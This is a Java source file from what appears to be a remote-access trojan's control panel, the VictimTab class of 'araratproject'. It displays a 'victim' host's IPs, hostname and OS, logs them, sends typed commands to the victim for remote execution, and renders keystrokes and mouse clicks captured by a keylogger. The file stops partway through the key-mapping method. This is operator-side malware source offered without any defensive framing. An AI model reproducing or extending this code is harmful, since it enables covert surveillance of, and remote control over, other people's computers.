package araratproject;
import static araratproject.ControlFrame.victimTab;
import java.awt.event.AdjustmentEvent;
import java.awt.event.AdjustmentListener;
import java.awt.event.KeyEvent;
import java.io.File;
import java.io.IOException;
import java.io.Serializable;
import java.util.logging.Level;
import java.util.logging.Logger;
import javax.swing.ImageIcon;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;

/**
 * VictimTab is the tab containing the Hosts info.
 *
 * @version 0.1
 * @author Andreas Demosthenous
 * @since 11/06/2020
 */
public class VictimTab extends JTabbedPane implements Serializable {

    private javax.swing.JInternalFrame InfoFrame;
    private javax.swing.JPanel KeyLoggerPanel;
    private javax.swing.JLabel KeyboardLogLabel;
    private javax.swing.JScrollPane PC_CommandAreaScroller;
    private javax.swing.JScrollPane PC_LogAreaScroller;
    private javax.swing.JScrollPane PC_LogAreaScroller1;
    private javax.swing.JInternalFrame PC_TerminalFrame;
    private javax.swing.JLabel SelectedHost;
    private javax.swing.JPanel TerminalPanel;
    private javax.swing.JTextArea infoArea;
    private javax.swing.JPanel infoPanel;
    private javax.swing.JScrollPane jScrollPane1;
    private javax.swing.JScrollPane jScrollPane10;
    private javax.swing.JScrollPane jScrollPane2;
    private javax.swing.JSeparator jSeparator1;
    private javax.swing.JTextArea keyLogArea;
    private javax.swing.JLabel keyboard;
    private javax.swing.JTextArea logArea;
    private javax.swing.JLabel logLabel;
    private javax.swing.JLabel mouse;
    private javax.swing.JLabel screenLabel;
    private javax.swing.JLabel statusLabel;

    private javax.swing.JLabel selectedLabel;
    private javax.swing.JTextArea sysInfoArea;
    private javax.swing.JTextArea terminalArea;
    private javax.swing.JTextField terminalCommandArea;
    private javax.swing.JTabbedPane victimTabbedPane;

    private Victim victim;
    private String prompt = "";
    private boolean shift = false;
    private boolean Caps = false;
    private ImageIcon KeyboardIcons[];
    private String directoriesPath;

    /**
     *
     * @param victim
     */
    public VictimTab(Victim victim) {
        this.victim = victim;
        initComponents();
        directoriesPath = new File(Server.settingsFrame.getVictimLogs().getPath() + "/Networks/" + victim.getPublicIP() + "/" + victim.getPrivateIP() + "/").getPath();

        selectedLabel.setEnabled(true);
        selectedLabel.setText(victim.getPrivateIP());

        String info = " Public ip: " + victim.getPublicIP() + "\n Gateway ip: "
                + victim.getGateway() + "\n Private ip: " + victim.getPrivateIP() + "\n"
                + " Subnetmask: " + victim.getSubnetmask() + "\n Hostname: " + victim.getHostName()
                + "\n OS: " + victim.getOperatingSystem() + "\n";
        infoArea.setText(info);

        try {
            if (Server.settingsFrame.saveVictims()) {
                Toolset.appendFile(new File(directoriesPath + "/Info.txt"), info);
            }
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(this, ex.getMessage(), " Error writing to victims log", JOptionPane.ERROR_MESSAGE);
        }

        setVisible(true);

        prompt = " " + victim.getHostName() + " > ";
        terminalCommandArea.setText(prompt);

        keyBoardImageInitializer();

    }

    public String toString() {
        return logArea.getText() + "---_---_---"
                + sysInfoArea.getText() + "---_---_---" + terminalArea.getText() + "---_---_---"
                + keyLogArea.getText();
    }

    /**
     *
     */
    public void disconnect() {
        selectedLabel.setEnabled(false);
        statusLabel.setText("Inactive");
        statusLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/redDot.png")));
    }

    /**
     *
     */
    public void connect() {
        selectedLabel.setEnabled(true);
        statusLabel.setText("Active now");
        statusLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/greenDot.png")));
    }

    private void terminalCommandAreaKeyTyped(java.awt.event.KeyEvent evt) {
        String data = terminalCommandArea.getText();
        if (data.length() <= prompt.length() || !data.contains(prompt)) {
            terminalCommandArea.setText(prompt);
        } else if (terminalCommandArea.getCaretPosition() < prompt.length()) {
            terminalCommandArea.setCaretPosition(prompt.length());
        }
    }

    private void terminalCommandAreaKeyPressed(java.awt.event.KeyEvent evt) {
        String data = terminalCommandArea.getText();
        if (evt.getKeyCode() == KeyEvent.VK_ENTER && victim.getSession() != null && victim.getSession().isActive()) {
            String command = extractCommand(data);
            appendTerminalArea(" " + data + "\n");
            victim.getSession().transmitData("TRMNL" + command);
            terminalCommandArea.setText(prompt);
        }
    }

    private void terminalCommandAreaMousePressed(java.awt.event.MouseEvent evt) {
        if (terminalCommandArea.getCaretPosition() < prompt.length()) {
            terminalCommandArea.setCaretPosition(prompt.length());
        }
    }

    /**
     *
     * @return
     */
    public JLabel getScreenLabel() {
        return screenLabel;
    }

    /**
     *
     * @param victim
     */
    public void setVictim(Victim victim) {
        this.victim = victim;
    }

    /**
     *
     * @return
     */
    public Victim getVictim() {
        return victim;
    }

    private void initComponents() {
        victimTabbedPane = new javax.swing.JTabbedPane();
        victimTab = new javax.swing.JTabbedPane();
        infoPanel = new javax.swing.JPanel();
        SelectedHost = new javax.swing.JLabel();
        selectedLabel = new javax.swing.JLabel();
        InfoFrame = new javax.swing.JInternalFrame();
        PC_LogAreaScroller1 = new javax.swing.JScrollPane();
        sysInfoArea = new javax.swing.JTextArea();
        jSeparator1 = new javax.swing.JSeparator();
        logLabel = new javax.swing.JLabel();
        jScrollPane2 = new javax.swing.JScrollPane();
        logArea = new javax.swing.JTextArea();
        jScrollPane1 = new javax.swing.JScrollPane();
        infoArea = new javax.swing.JTextArea();
        statusLabel = new javax.swing.JLabel();
        TerminalPanel = new javax.swing.JPanel();
        PC_TerminalFrame = new javax.swing.JInternalFrame();
        PC_LogAreaScroller = new javax.swing.JScrollPane();
        terminalArea = new javax.swing.JTextArea();
        PC_CommandAreaScroller = new javax.swing.JScrollPane();
        terminalCommandArea = new javax.swing.JTextField();
        KeyLoggerPanel = new javax.swing.JPanel();
        KeyboardLogLabel = new javax.swing.JLabel();
        jScrollPane10 = new javax.swing.JScrollPane();
        keyLogArea = new javax.swing.JTextArea();
        keyboard = new javax.swing.JLabel();
        mouse = new javax.swing.JLabel();

        victimTabbedPane.setTabPlacement(javax.swing.JTabbedPane.RIGHT);
        victimTabbedPane.setToolTipText("");
        victimTabbedPane.setFont(new java.awt.Font("Arial", 1, 14));

        setBackground(new java.awt.Color(255, 255, 255));
        setToolTipText("");
        setCursor(new java.awt.Cursor(java.awt.Cursor.DEFAULT_CURSOR));
        setFont(new java.awt.Font("Arial", 1, 18));

        infoPanel.setBackground(new java.awt.Color(255, 255, 255));

        SelectedHost.setFont(new java.awt.Font("Arial", 1, 20));
        SelectedHost.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/tick.png")));
        SelectedHost.setText("Selected Host:");

        selectedLabel.setBackground(new java.awt.Color(255, 255, 255));
        selectedLabel.setFont(new java.awt.Font("Tahoma", 0, 18));
        selectedLabel.setHorizontalAlignment(javax.swing.SwingConstants.CENTER);
        selectedLabel.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/PCEnabled.png")));
        selectedLabel.setText("Unassigned");
        selectedLabel.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        selectedLabel.setDisabledIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/Images/PCEnabled.png")));
        selectedLabel.setEnabled(false);
        selectedLabel.setHorizontalTextPosition(javax.swing.SwingConstants.CENTER);
        selectedLabel.setMaximumSize(new java.awt.Dimension(139, 128));
        selectedLabel.setMinimumSize(new java.awt.Dimension(139, 128));
        selectedLabel.setName("");
        selectedLabel.setOpaque(true);
        selectedLabel.setPreferredSize(new java.awt.Dimension(139, 128));
        selectedLabel.setRequestFocusEnabled(false);
        selectedLabel.setVerticalTextPosition(javax.swing.SwingConstants.BOTTOM);
        selectedLabel.setBorder(new javax.swing.border.SoftBevelBorder(javax.swing.border.BevelBorder.RAISED, new java.awt.Color(102, 102, 102), new java.awt.Color(51, 51, 51), new java.awt.Color(0, 0, 0), new java.awt.Color(102, 102, 102)));

        InfoFrame.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        InfoFrame.setTitle("System Info");
        InfoFrame.setFrameIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/terminalIcon.png")));
        InfoFrame.setMinimumSize(new java.awt.Dimension(0, 0));
        InfoFrame.setVisible(true);

        PC_LogAreaScroller1.setToolTipText("");
        PC_LogAreaScroller1.setVerticalScrollBarPolicy(javax.swing.ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        PC_LogAreaScroller1.setAutoscrolls(true);
        PC_LogAreaScroller1.setFont(new java.awt.Font("Sylfaen", 1, 24));
        PC_LogAreaScroller1.setMinimumSize(new java.awt.Dimension(0, 0));

        sysInfoArea.setEditable(false);
        sysInfoArea.setBackground(new java.awt.Color(0, 0, 0));
        sysInfoArea.setColumns(20);
        sysInfoArea.setFont(new java.awt.Font("Monospaced", 0, 24));
        sysInfoArea.setForeground(new java.awt.Color(255, 255, 255));
        sysInfoArea.setRows(5);
        sysInfoArea.setCaretColor(new java.awt.Color(255, 255, 255));
        sysInfoArea.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        sysInfoArea.setMinimumSize(new java.awt.Dimension(0, 0));
        sysInfoArea.setSelectionColor(new java.awt.Color(255, 0, 0));
        PC_LogAreaScroller1.setViewportView(sysInfoArea);

        org.jdesktop.layout.GroupLayout InfoFrameLayout = new org.jdesktop.layout.GroupLayout(InfoFrame.getContentPane());
        InfoFrame.getContentPane().setLayout(InfoFrameLayout);
        InfoFrameLayout.setHorizontalGroup(
                InfoFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(org.jdesktop.layout.GroupLayout.TRAILING, PC_LogAreaScroller1, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 1029, Short.MAX_VALUE)
        );
        InfoFrameLayout.setVerticalGroup(
                InfoFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(PC_LogAreaScroller1, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
        );

        jSeparator1.setOrientation(javax.swing.SwingConstants.VERTICAL);

        logLabel.setFont(new java.awt.Font("Arial", 1, 20));
        logLabel.setText("Log:");

        jScrollPane2.setInheritsPopupMenu(true);

        logArea.setEditable(false);
        logArea.setColumns(10);
        logArea.setFont(new java.awt.Font("Tahoma", 0, 20));
        logArea.setRows(5);
        logArea.setAutoscrolls(false);
        logArea.setMinimumSize(new java.awt.Dimension(0, 0));
        jScrollPane2.setViewportView(logArea);

        jScrollPane1.setMaximumSize(new java.awt.Dimension(999999, 90));
        jScrollPane1.setPreferredSize(new java.awt.Dimension(183, 90));

        infoArea.setEditable(false);
        infoArea.setColumns(20);
        infoArea.setFont(new java.awt.Font("Monospaced", 0, 16));
        infoArea.setRows(5);
        infoArea.setBorder(javax.swing.BorderFactory.createEmptyBorder(1, 1, 1, 1));

        infoArea.setMinimumSize(new java.awt.Dimension(0, 0));
        jScrollPane1.setViewportView(infoArea);

        statusLabel.setFont(new java.awt.Font("Arial", 1, 16));
        statusLabel.setText("Active now");

        org.jdesktop.layout.GroupLayout infoPanelLayout = new org.jdesktop.layout.GroupLayout(infoPanel);
        infoPanel.setLayout(infoPanelLayout);
        infoPanelLayout.setHorizontalGroup(
                infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(infoPanelLayout.createSequentialGroup()
                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                        .add(org.jdesktop.layout.GroupLayout.TRAILING, infoPanelLayout.createSequentialGroup()
                                                .add(11, 11, 11)
                                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                                        .add(org.jdesktop.layout.GroupLayout.TRAILING, infoPanelLayout.createSequentialGroup()
                                                                .add(1, 1, 1)
                                                                .add(jScrollPane2))
                                                        .add(org.jdesktop.layout.GroupLayout.TRAILING, jScrollPane1, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE))
                                                .add(19, 19, 19))
                                        .add(infoPanelLayout.createSequentialGroup()
                                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                                        .add(infoPanelLayout.createSequentialGroup()
                                                                .addContainerGap()
                                                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                                                        .add(logLabel, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 314, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                                                                        .add(statusLabel)))
                                                        .add(infoPanelLayout.createSequentialGroup()
                                                                .addContainerGap(org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                                                        .add(SelectedHost)
                                                                        .add(selectedLabel, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 186, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE))
                                                                .add(0, 0, Short.MAX_VALUE)))
                                                .addPreferredGap(org.jdesktop.layout.LayoutStyle.UNRELATED)))
                                .add(jSeparator1, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 5, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                                .add(10, 10, 10)
                                .add(InfoFrame, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                .add(10, 10, 10))
        );
        infoPanelLayout.setVerticalGroup(
                infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(infoPanelLayout.createSequentialGroup()
                                .addContainerGap()
                                .add(infoPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                        .add(InfoFrame, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                                        .add(infoPanelLayout.createSequentialGroup()
                                                .add(SelectedHost)
                                                .add(2, 2, 2)
                                                .add(selectedLabel, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 139, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                                                .addPreferredGap(org.jdesktop.layout.LayoutStyle.UNRELATED)
                                                .add(statusLabel)
                                                .addPreferredGap(org.jdesktop.layout.LayoutStyle.RELATED)
                                                .add(jScrollPane1, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 169, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                                                .addPreferredGap(org.jdesktop.layout.LayoutStyle.UNRELATED)
                                                .add(logLabel)
                                                .addPreferredGap(org.jdesktop.layout.LayoutStyle.RELATED)
                                                .add(jScrollPane2, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 347, Short.MAX_VALUE)))
                                .addContainerGap())
                        .add(org.jdesktop.layout.GroupLayout.TRAILING, jSeparator1)
        );

        addTab("Information", infoPanel);

        PC_TerminalFrame.setBorder(javax.swing.BorderFactory.createEtchedBorder());
        PC_TerminalFrame.setResizable(true);
        PC_TerminalFrame.setFrameIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/icons/terminalIcon.png")));
        PC_TerminalFrame.setTitle("Command Line");
        PC_TerminalFrame.setVisible(true);

        PC_LogAreaScroller.setHorizontalScrollBarPolicy(javax.swing.ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        PC_LogAreaScroller.setToolTipText("");
        PC_LogAreaScroller.setVerticalScrollBarPolicy(javax.swing.ScrollPaneConstants.VERTICAL_SCROLLBAR_ALWAYS);
        PC_LogAreaScroller.setAutoscrolls(true);
        PC_LogAreaScroller.setFont(new java.awt.Font("Sylfaen", 1, 24));

        terminalArea.setEditable(false);
        terminalArea.setBackground(new java.awt.Color(0, 0, 0));
        terminalArea.setColumns(20);
        terminalArea.setFont(new java.awt.Font("Monospaced", 0, 24));
        terminalArea.setForeground(new java.awt.Color(255, 255, 255));
        terminalArea.setRows(5);
        terminalArea.setCaretColor(new java.awt.Color(255, 255, 255));
        terminalArea.setCursor(new java.awt.Cursor(java.awt.Cursor.TEXT_CURSOR));
        terminalArea.setSelectionColor(new java.awt.Color(255, 0, 0));
        PC_LogAreaScroller.setViewportView(terminalArea);

        PC_CommandAreaScroller.setHorizontalScrollBarPolicy(javax.swing.ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
        PC_CommandAreaScroller.setVerticalScrollBarPolicy(javax.swing.ScrollPaneConstants.VERTICAL_SCROLLBAR_NEVER);
        PC_CommandAreaScroller.setMaximumSize(new java.awt.Dimension(6, 23));
        PC_CommandAreaScroller.setMinimumSize(new java.awt.Dimension(6, 23));
        PC_CommandAreaScroller.setPreferredSize(new java.awt.Dimension(6, 23));

        terminalCommandArea.setBackground(new java.awt.Color(0, 0, 0));
        terminalCommandArea.setFont(new java.awt.Font("Monospaced", 0, 29));
        terminalCommandArea.setForeground(new java.awt.Color(255, 255, 255));
        terminalCommandArea.setText(" PC_SAMPLE > ");
        terminalCommandArea.setToolTipText("");
        terminalCommandArea.setCaretColor(new java.awt.Color(255, 255, 255));
        terminalCommandArea.setMaximumSize(new java.awt.Dimension(126, 33));
        terminalCommandArea.setMinimumSize(new java.awt.Dimension(126, 33));
        terminalCommandArea.setSelectionColor(new java.awt.Color(255, 0, 0));
        terminalCommandArea.addMouseListener(new java.awt.event.MouseAdapter() {
            public void mousePressed(java.awt.event.MouseEvent evt) {
                terminalCommandAreaMousePressed(evt);
            }
        });
        terminalCommandArea.addKeyListener(new java.awt.event.KeyAdapter() {
            public void keyPressed(java.awt.event.KeyEvent evt) {
                terminalCommandAreaKeyPressed(evt);
            }

            public void keyTyped(java.awt.event.KeyEvent evt) {
                terminalCommandAreaKeyTyped(evt);
            }
        });
        PC_CommandAreaScroller.setViewportView(terminalCommandArea);

        org.jdesktop.layout.GroupLayout PC_TerminalFrameLayout = new org.jdesktop.layout.GroupLayout(PC_TerminalFrame.getContentPane());
        PC_TerminalFrame.getContentPane().setLayout(PC_TerminalFrameLayout);
        PC_TerminalFrameLayout.setHorizontalGroup(
                PC_TerminalFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(PC_CommandAreaScroller, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)
                        .add(PC_LogAreaScroller, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 1387, Short.MAX_VALUE)
        );
        PC_TerminalFrameLayout.setVerticalGroup(
                PC_TerminalFrameLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(PC_TerminalFrameLayout.createSequentialGroup()
                                .add(PC_LogAreaScroller, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 711, Short.MAX_VALUE)
                                .add(0, 0, 0)
                                .add(PC_CommandAreaScroller, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 56, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE))
        );

        org.jdesktop.layout.GroupLayout TerminalPanelLayout = new org.jdesktop.layout.GroupLayout(TerminalPanel);
        TerminalPanel.setLayout(TerminalPanelLayout);
        TerminalPanelLayout.setHorizontalGroup(
                TerminalPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(PC_TerminalFrame)
        );
        TerminalPanelLayout.setVerticalGroup(
                TerminalPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(PC_TerminalFrame)
        );

        try {
            PC_TerminalFrame.setIcon(true);
        } catch (java.beans.PropertyVetoException ex) {
            JOptionPane.showMessageDialog(this, ex.getMessage(), " Error setting the terminal area icon", JOptionPane.ERROR_MESSAGE);
        }

        addTab("Terminal", TerminalPanel);

        KeyLoggerPanel.setBackground(new java.awt.Color(255, 255, 255));

        KeyboardLogLabel.setFont(new java.awt.Font("Arial", 1, 18));
        KeyboardLogLabel.setText("Log:");

        keyLogArea.setEditable(false);
        keyLogArea.setBackground(new java.awt.Color(236, 235, 235));
        keyLogArea.setColumns(20);
        keyLogArea.setFont(new java.awt.Font("Arial", 0, 20));
        keyLogArea.setLineWrap(true);
        keyLogArea.setRows(5);
        jScrollPane10.setViewportView(keyLogArea);

        keyboard.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/KeyboardImages/75.jpg")));

        mouse.setIcon(new javax.swing.ImageIcon(getClass().getResource("/araratproject/KeyboardImages/0.png")));

        org.jdesktop.layout.GroupLayout KeyLoggerPanelLayout = new org.jdesktop.layout.GroupLayout(KeyLoggerPanel);
        KeyLoggerPanel.setLayout(KeyLoggerPanelLayout);
        KeyLoggerPanelLayout.setHorizontalGroup(
                KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(KeyLoggerPanelLayout.createSequentialGroup()
                                .addContainerGap()
                                .add(KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                                        .add(jScrollPane10)
                                        .add(KeyLoggerPanelLayout.createSequentialGroup()
                                                .add(KeyboardLogLabel)
                                                .add(0, 0, Short.MAX_VALUE))
                                        .add(KeyLoggerPanelLayout.createSequentialGroup()
                                                .add(0, 308, Short.MAX_VALUE)
                                                .add(keyboard)
                                                .add(18, 18, 18)
                                                .add(mouse)
                                                .add(0, 292, Short.MAX_VALUE)))
                                .addContainerGap())
        );
        KeyLoggerPanelLayout.setVerticalGroup(
                KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.LEADING)
                        .add(KeyLoggerPanelLayout.createSequentialGroup()
                                .add(KeyLoggerPanelLayout.createParallelGroup(org.jdesktop.layout.GroupLayout.TRAILING)
                                        .add(keyboard, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 285, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE)
                                        .add(mouse, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE, 296, org.jdesktop.layout.GroupLayout.PREFERRED_SIZE))
                                .add(2, 2, 2)
                                .add(KeyboardLogLabel)
                                .addPreferredGap(org.jdesktop.layout.LayoutStyle.RELATED)
                                .add(jScrollPane10, org.jdesktop.layout.GroupLayout.DEFAULT_SIZE, 459, Short.MAX_VALUE)
                                .addContainerGap())
        );

        addTab("Key logger", KeyLoggerPanel);

        victimTabbedPane.addTab(victim.getPrivateIP(), this);

    }

    private void keyBoardImageInitializer() {

        //Array declaration.
        KeyboardIcons = new ImageIcon[80];

        for (int i = 1; i <= 79; i++) {
            KeyboardIcons[i] = new ImageIcon(getClass().getResource("KeyboardImages/" + i + ".jpg"));
        }

    }

    private void appendKey(int Type, String key) throws InterruptedException, IOException {

        if (Type == 2) {
            //key released 
            if (key.equals("42")) {
                shift = false;
            }
            keyboard.setIcon(KeyboardIcons[75]);

        } else if (Type == 3) {
            //mouse pressed
            if (key.equals("1")) {
                mouse.setIcon(KeyboardIcons[76]);
                appendKeyLogArea(" [LEFT CLICK] ");
            } else if (key.equals("2")) {
                mouse.setIcon(KeyboardIcons[77]);
                appendKeyLogArea(" [RIGHT CLICK] ");
            }

        } else if (Type == 4) {
            //mouse released
            mouse.setIcon(KeyboardIcons[79]);

        } else if (Type == 1) {
            //Key pressed
            if (key.equals("2") && shift == true) {
                keyboard.setIcon(KeyboardIcons[1]);
                appendKeyLogArea("!");

            } else if (key.equals("3") && shift == true) {
                keyboard.setIcon(KeyboardIcons[2]);
                appendKeyLogArea("@");
            } else if (key.equals("4") && shift == true) {
                keyboard.setIcon(KeyboardIcons[3]);
                appendKeyLogArea("#");
            } else if (key.equals("5") && shift == true) {
                keyboard.setIcon(KeyboardIcons[4]);
                appendKeyLogArea("$");
            } else if (key.equals("6") && shift == true) {
                keyboard.setIcon(KeyboardIcons[5]);
                appendKeyLogArea("%");
            } else if (key.equals("7") && shift == true) {
                keyboard.setIcon(KeyboardIcons[6]);
                appendKeyLogArea("^");
            } else if (key.equals("8") && shift == true) {
                keyboard.setIcon(KeyboardIcons[7]);
                appendKeyLogArea("&");
            } else if (key.equals("9") && shift == true) {
                keyboard.setIcon(KeyboardIcons[8]);
                appendKeyLogArea("*");
            } else if (key.equals("10") && shift == true) {
                keyboard.setIcon(KeyboardIcons[9]);
                appendKeyLogArea("(");
            } else if (key.equals("11") && shift == true) {
                keyboard.setIcon(KeyboardIcons[18]);
                appendKeyLogArea(")");
            } else if (key.equals("1")) {
                keyboard.setIcon(KeyboardIcons[32]);
                appendKeyLogArea(" [ESC] ");
            } else if (key.equals("2")) {
                keyboard.setIcon(KeyboardIcons[1]);
                appendKeyLogArea("1");

            } else if (key.equals("3")) {
                keyboard.setIcon(KeyboardIcons[2]);
                appendKeyLogArea("2");

            } else if (key.equals("4")) {
                keyboard.setIcon(KeyboardIcons[3]);
                appendKeyLogArea("3");

            } else if (key.equals("5")) {
                keyboard.setIcon(KeyboardIcons[4]);
                appendKeyLogArea("4");

            } else if (key.equals("6")) {
                keyboard.setIcon(KeyboardIcons[5]);
                appendKeyLogArea("5");

            } else if (key.equals("7")) {
                keyboard.setIcon(KeyboardIcons[6]);
                appendKeyLogArea("6");

            } else if (key.equals("8")) {
                keyboard.setIcon(KeyboardIcons[7]);
                appendKeyLogArea("7");

            } else if (key.equals("9")) {
                keyboard.setIcon(KeyboardIcons[8]);
                appendKeyLogArea("8");

            } else if (key.equals("10")) {
                keyboard.setIcon(KeyboardIcons[9]);
                appendKeyLogArea("9");

            } else if (key.equals("11")) {
                keyboard.setIcon(KeyboardIcons[18]);
                appendKeyLogArea("0");

            } else if (key.equals("12")) {
                keyboard.setIcon(KeyboardIcons[12]);
                if (shift) {
                    appendKeyLogArea("_");
                } else {
                    appendKeyLogArea("-");

                }

            } else if (key.equals("13")) {
                keyboard.setIcon(KeyboardIcons[17]);
                if (shift) {
                    appendKeyLogArea("+");
                } else {
                    appendKeyLogArea("=");

                }

            } else if (key.equals("14")) {
                keyboard.setIcon(KeyboardIcons[23]);
                if (!"".equals(keyLogArea.getText())) {
                    appendKeyLogArea(" [BACKSPACE] ");
                }

            } else if (key.equals("15")) {
                keyboard.setIcon(KeyboardIcons[68]);
                appendKeyLogArea(" [TAB] ");

            } else if (key.equals("16")) {
                keyboard.setIcon(KeyboardIcons[57]);
                if (Caps || shift) {
                    appendKeyLogArea("Q");
                } else {
                    appendKeyLogArea("q");
                }

            } else if (key.equals("17")) {
                keyboard.setIcon(KeyboardIcons[71]);
                if (Caps || shift) {
                    appendKeyLogArea("W");
                } else {
                    appendKeyLogArea("w");
                }
            } else if (key.equals("18")) {
                keyboard.setIcon(KeyboardIcons[30]);
                if (Caps || shift) {
                    appendKeyLogArea("E");
                } else {
                    appendKeyLogArea("e");
                }
            } else if (key.equals("19")) {
                keyboard.setIcon(KeyboardIcons[58]);
                if (Caps || shift) {
                    appendKeyLogArea("R");
                } else {
                    appendKeyLogArea("r");
                }
            } else if (key.equals("20")) {
                keyboard.setIcon(KeyboardIcons[67]);
                if (Caps || shift) {
                    appendKeyLogArea("T");
                } else {
                    appendKeyLogArea("t");
                }
            } else if (key.equals("21")) {
                keyboard.setIcon(KeyboardIcons[73]);
                if (Caps || shift) {
                    appendKeyLogArea("Y");
                } else {
                    appendKeyLogArea("y");
                }
            } else if (key.equals("22")) {
                keyboard.setIcon(KeyboardIcons[69]);
                if (Caps || shift) {
                    appendKeyLogArea("U");
                } else {
                    appendKeyLogArea("u");
                }
            } else if (key.equals("23")) {
                keyboard.setIcon(KeyboardIcons[49]);
                if (Caps || shift) {
                    appendKeyLogArea("I");
                } else {
                    appendKeyLogArea("i");
                }
            } else if (key.equals("24")) {
                keyboard.setIcon(KeyboardIcons[55]);
                if (Caps || shift) {
                    appendKeyLogArea("O");
                } else {
                    appendKeyLogArea("o");
                }
            } else if (key.equals("25")) {
                keyboard.setIcon(KeyboardIcons[56]);
                if (Caps || shift) {
                    appendKeyLogArea("P");
                } else {
                    appendKeyLogArea("p");
                }
            } else if (key.equals("26")) {
                keyboard.setIcon(KeyboardIcons[14]);
                if (shift) {
                    appendKeyLogArea("{");
                } else {
                    appendKeyLogArea("[");
                }

            } else if (key.equals("27")) {
                keyboard.setIcon(KeyboardIcons[15]);
                if (shift) {
                    appendKeyLogArea("}");
                } else {
                    appendKeyLogArea("]");

                }

            } else if (key.equals("28")) {
                keyboard.setIcon(KeyboardIcons[31]);
                appendKeyLogArea(" [ENTER] ");

            } else if (key.equals("29")) {
                keyboard.setIcon(KeyboardIcons[26]);
                appendKeyLogArea(" [CTRL] ");

            } else if (key.equals("30")) {
                keyboard.setIcon(KeyboardIcons[19]);
                if (Caps || shift) {
                    appendKeyLogArea("A");
                } else {
                    appendKeyLogArea("a");
                }

            } else if (key.equals("31")) {
                keyboard.setIcon(KeyboardIcons[59]);
                if (Caps || shift) {
                    appendKeyLogArea("S");
                } else {
                    appendKeyLogArea("s");
                }
            } else if (key.equals("32")) {
                keyboard.setIcon(KeyboardIcons[28]);
                if (Caps || shift) {
                    appendKeyLogArea("D");
                } else {
                    appendKeyLogArea("d");
                }
            } else if (key.equals("33")) {
                keyboard.setIcon(KeyboardIcons[33]);
                if (Caps || shift) {
                    appendKeyLogArea("F");
                } else {
                    appendKeyLogArea("f");
                }
            } else if (key.equals("34")) {
                keyboard.setIcon(KeyboardIcons[47]);
                if (Caps || shift) {
                    appendKeyLogArea("G");
                } else {
                    appendKeyLogArea("g");
                }
            } else if (key.equals("35")) {
                keyboard.setIcon(KeyboardIcons[48]);
                if (Caps || shift) {
                    appendKeyLogArea("H");
                } else {
                    appendKeyLogArea("h");
                }
            } else if (key.equals("36")) {
                keyboard.setIcon(KeyboardIcons[50]);
